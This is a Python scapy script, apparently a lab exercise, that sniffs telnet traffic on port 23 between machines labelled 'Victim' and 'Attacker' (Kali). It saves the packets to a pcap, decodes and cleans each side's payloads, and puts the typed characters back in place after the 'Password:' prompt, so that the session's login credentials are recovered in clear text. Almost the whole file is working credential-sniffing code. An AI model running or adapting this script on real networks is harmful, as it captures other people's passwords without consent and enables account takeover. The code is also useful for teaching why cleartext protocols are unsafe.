from scapy.all import *

interfaces = ["eth0", "lo"] # Select network interfaces
filt = "port 23" # Select ports 
wireFile = "wireOutput.pcap" # Output pcap file
ipUb = "192.168.245.15" # IP address of Victim Machine
ipKali = "192.168.245.14" # IP address of Attacker Machine

nFDataFileKali = "notFilteredOutputKali.txt"
fDataFileKali = "filteredOutputKali.txt" # Raw data from Attacker Machine

nFDataFileUbuntu = "notFilteredOutputUbuntu.txt"
fDataFileUbuntu = "filteredOutputUbuntu.txt" # Raw data from Victim Machine

capture = sniff(iface=interfaces, filter=filt, count=200) # Set a counter
wrpcap(wireFile, capture)

alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '$', '/', '*', '.']

def write_data(file_path, data_list):
	try:
		with open(file_path, "w") as file:
			for data in data_list:
				file.write(data)
	except Exception as e:
		print(f"Error writing data to file: {e}")

def read_data(file_path):
	with open(file_path, "r") as f:
		data = f.readlines()
	return data

def seeData(wFile):
	packets = rdpcap(wFile)
	dataListUb = []
	dataListKali = []

	for packet in packets:
		if IP in packet and Raw in packet:
			if packet[IP].src == ipKali:
				pkt = packet[Raw].load.decode('latin-1')
				dataListKali.append(pkt)
			elif packet[IP].src == ipUb:
				pkt = packet[Raw].load.decode('latin-1')
				dataListUb.append(pkt)
	write_data(nFDataFileKali, dataListKali)
	write_data(nFDataFileUbuntu, dataListUb)
	return dataListKali, dataListUb

def filter_data(filePath):
	filteredData = []
	data = read_data(filePath)
	
	for dt in data:
		clean_dt1 = dt.replace('\x1b[0m', '')
		clean_dt2 = clean_dt1.replace('\x1b[01;34m', '')
		clean_dt3 = clean_dt2.replace(' s1 3840038400kali:0.0DISPLAYkali:0.0XTERM256COLORseed', '')
		for char in clean_dt3:
			if char in alphabet:
				filteredData.append(char)
			elif char == "\n":
				filteredData.append("\n")
	return filteredData

def mergeOutputs(file1, file2):
	with open(file1, "r") as fK:
		fK_lines = fK.readlines()
		dtk = fK_lines[1]
		print(f"dtk : {dtk}")
	
	with open(file2, "r+") as fU:
		fU_list = []
		fU_lines = fU.readlines()
		for line in fU_lines:
			fU_list.append(line)
			if line.startswith("Password:"):
				fU_list.append(dtk+'\n')
		with open("cleanFile.txt", "w") as cF:
			for ln in fU_list:
				cF.write(ln)

if __name__ == "__main__":
	line = "-" * 25

	print(f"{line} Part 1 : sniff the network {line}")
	pkts = seeData(wireFile)
	print(f"Packets of the Wireshark file : {pkts}")
	
	print(f"{line} Part 2 : filtering the data for Kali {line}")
	filteredPktsKali = filter_data(nFDataFileKali)
	
	print(f"{line} Part 3 : filtering the data for Ubuntu {line}")
	filteredPktsUbuntu = filter_data(nFDataFileUbuntu)
	
	write_data(fDataFileKali, filteredPktsKali)
	print(f"Data written in {fDataFileKali} for Kali")

	write_data(fDataFileUbuntu, filteredPktsUbuntu)
	print(f"Data written in {fDataFileUbuntu} for Ubuntu")